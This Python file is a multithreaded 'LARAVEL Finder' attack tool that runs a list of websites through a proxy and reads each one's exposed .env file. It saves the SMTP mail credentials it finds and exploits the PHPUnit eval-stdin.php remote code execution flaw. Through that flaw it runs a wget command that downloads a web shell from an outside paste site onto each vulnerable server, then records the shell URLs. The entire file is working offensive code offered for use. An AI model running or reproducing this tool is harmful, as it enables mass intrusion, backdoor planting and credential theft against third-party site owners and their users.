import os
import re
import requests
from colorama import Fore
from multiprocessing import Pool
import sys

yl = Fore.YELLOW
red = Fore.RED
gr = Fore.GREEN

proxy_host = 'YOUR_PROXY_HOST'
proxy_port = 'YOUR_PROXY_PORT'
proxy_username = 'YOUR_PROXY_USERNAME'
proxy_password = 'YOUR_PROXY_PASSWORD'

proxies = {
    'http': f'http://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}',
    'https': f'http://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}'
}

headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"}


def shell(site):
     try:
         test = '<?php echo php_uname("a"); ?>'
         up = '<?php system("wget https://paste.bingner.com/paste/9dkp5/raw -O ict.php"); ?>'
         cek = requests.get(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=test, headers=headers, timeout=13)
         if 'Linux' in cek.text:
             shellup = requests.get(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=up, headers=headers,  timeout=13)
             if shellup.ok:
                 print(f"{site} {gr}[SHELL]")
                 open('shell.txt', 'a').write(site + '/vendor/phpunit/phpunit/src/Util/PHP/ict.php' + '\n')
             else:
                 print(f"{site} {yl}[UPLOAD FAILED ]")
                 open('failedshell.txt', 'a').write(site + '\n')
         else:
             print(f"{site} {red}[NOT VULN]")
     except:
         pass
def get_smtp(site, url):
    try:
        if "APP_NAME" in url:
            host = re.findall("\nMAIL_HOST=(.*?)\n", url)
            port = re.findall("\nMAIL_PORT=(.*?)\n",url)
            user = re.findall("\nMAIL_USERNAME=(.*?)\n", url)
            pswd = re.findall("\nMAIL_PASSWORD=(.*?)\n", url)
            dele = ["\r",'"',"'","(",")"]
            smtp = str(host+port+user+pswd)[1:-1]
            for w in dele:
                smtp = smtp.replace(w,"")
            if "null" in smtp:
                print(f"{site} {yl}[NULL]")
            else:
                print(f"{site} {gr}[SMTP]")
                open("smtp.txt", "a+").write(smtp + "\n")
        else:
            print(f"{site} {yl}[NULL]")
    except:
        pass
def fix(site):
    if "://" in site:
        site = site
    else:
        site = "http://" + site
    site = site.replace("\n", "").replace("\r", "")
    try:
        url = requests.get(site + "/.env", headers=headers, timeout=12).text
        if "APP_KEY" in url:
            open('laravelsites.txt', 'a').write(site+'\n')
            shell(site)
            get_smtp(site, url)
        elif "/wp-content/" in url:
            open('wordpresssites.txt', 'a').write(site + '\n')
        else:

            open('NotLarvel.txt', 'a').write(site + '\n')
    except:
        pass

def main():
    if len(sys.argv) != 3:
        sys.exit("arguement missing, python grabber.py list.txt 200")
    else:
        pass
    try:
        os.system("cls")
        os.system("clear")
    except:
        pass
    print(red + "××××××××××××××××××××××××××××××××××××××××××××××××××××××××")
    print(gr  + "×                                                      ×")
    print(gr  + "×                   LARAVEL Finder                     ×")
    print(gr  + "×                   CODED BY ME :-)                    ×")
    print(gr  + "×                   github SurajMishra0                ×")
    print(gr  + "×                                                      ×")
    print(red + "××××××××××××××××××××××××××××××××××××××××××××××××××××××××")
    print(gr  +  "    -GET SHELL,SMTP, ETC FROM LARAVEL SITES-\n         ")

    site = open(sys.argv[1], "r").readlines()
    Thread = int(sys. argv[2])
    if Thread > 200:
        sys.exit("maximum thread limit is 200")
    else:
        pass

    try:
        ThreadPool = Pool(Thread)
        ThreadPool.map(fix, site)
        ThreadPool.close()
        ThreadPool.join()
    except:
        pass
if __name__ == "__main__":
    main()
